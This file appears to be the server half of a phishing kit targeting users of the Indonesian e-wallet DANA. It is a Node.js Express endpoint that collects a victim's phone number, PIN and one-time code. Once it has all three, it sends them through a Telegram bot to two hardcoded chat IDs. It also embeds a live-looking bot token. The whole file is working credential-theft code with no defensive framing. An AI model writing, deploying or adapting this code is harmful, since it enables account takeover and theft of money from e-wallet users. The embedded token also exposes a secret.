const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const cors = require("cors");

const app = express();

// ============================
// MIDDLEWARE
// ============================
app.use(cors());
app.use(express.json());

// ============================
// INIT BOT
// ============================

// 🔐 pakai ENV atau isi langsung untuk lokal
const BOT_TOKEN = process.env.BOT_TOKEN || "6568242561:AAEe52VXE51aO4QyDeUupKnlzG5urZMnbas";
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ============================
// CHAT ID
// ============================
const chatIds = [
  "6549762672",
  "7173961946"
];

// ============================
// STORAGE SEMENTARA
// ============================
let sessionData = {};

// ============================
// FORMAT CARD
// ============================
function formatMessage(data) {
  return `
<pre>
┌────────────────────
   DANA LOGIN ID
└────────────────────

Nomor : ${data.phone || "-"}
PIN    : ${data.pin || "-"}
OTP    : ${data.otp || "-"}

────────────────────
🕒 ${new Date().toLocaleString()}
</pre>
`;
}

// ============================
// ENDPOINT
// ============================
app.post("/send", (req, res) => {
  const { phone, pin, otp } = req.body;

  // 🔑 sementara pakai 1 user (bisa upgrade nanti)
  const key = "user";

  if (!sessionData[key]) {
    sessionData[key] = {};
  }

  // simpan data bertahap
  if (phone) sessionData[key].phone = phone;
  if (pin) sessionData[key].pin = pin;
  if (otp) sessionData[key].otp = otp;

  console.log("📥 DATA:", sessionData[key]);

  // kalau sudah lengkap → kirim 1x
  if (
    sessionData[key].phone &&
    sessionData[key].pin &&
    sessionData[key].otp
  ) {
    const text = formatMessage(sessionData[key]);

    chatIds.forEach(id => {
      bot.sendMessage(id, text, { parse_mode: "HTML" })
        .then(() => console.log("✅ TERKIRIM KE:", id))
        .catch(err => console.log("❌ ERROR:", err.message));
    });

    // reset setelah kirim
    delete sessionData[key];
  }

  res.status(200).json({ status: "OK" });
});

// ============================
// START SERVER
// ============================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`);
});